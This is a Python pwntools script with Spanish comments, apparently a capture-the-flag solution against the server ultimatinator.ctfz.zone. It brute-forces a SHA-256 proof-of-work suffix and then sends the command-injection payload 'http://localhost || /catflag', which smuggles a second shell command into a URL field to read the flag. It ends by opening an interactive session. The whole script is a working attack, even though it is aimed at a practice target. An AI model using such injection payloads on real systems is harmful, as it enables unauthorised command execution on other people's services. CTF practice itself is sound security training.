from pwn import *
import hashlib
import string
import itertools

# Conectarse al servidor
io = remote('ultimatinator.ctfz.zone', 13339)

# Recibir el mensaje inicial del servidor que contiene el hash objetivo
#initial_message = io.recvline().decode()
#print(initial_message)

# Extraer el hash objetivo (últimos 6 caracteres) del mensaje
#target_suffix = initial_message.split()[-1][:6]  # Aquí extraemos '52d83f' por ejemplo

io.recvuntil("Try to break my pow: ")
target_suffix = io.recv(6).decode()
print(f"Tu target: {target_suffix}")

def find_fast_matching_hash(target_suffix):
    base_string = 'abcdefghijklmnopqrstuvwxyzabcdef'  # Cadena base de 32 caracteres (solo letras)
    
    # Iterar sobre todas las combinaciones posibles de los últimos 6 caracteres usando solo letras
    for suffix in itertools.product(string.ascii_lowercase, repeat=6):
        candidate = (base_string[:-6] + ''.join(suffix)).encode()  # Modifica solo los últimos 6 caracteres
        candidate_hash = hashlib.sha256(candidate).hexdigest()
        
        if candidate_hash[-6:] == target_suffix:
            return candidate.decode()


# Buscar la cadena que cumple con el hash objetivo
result = find_fast_matching_hash(target_suffix)
print(f"Entrada encontrada: {result}")

io.sendline(result.encode())

io.sendline(b"http://localhost || /catflag")

io.interactive()

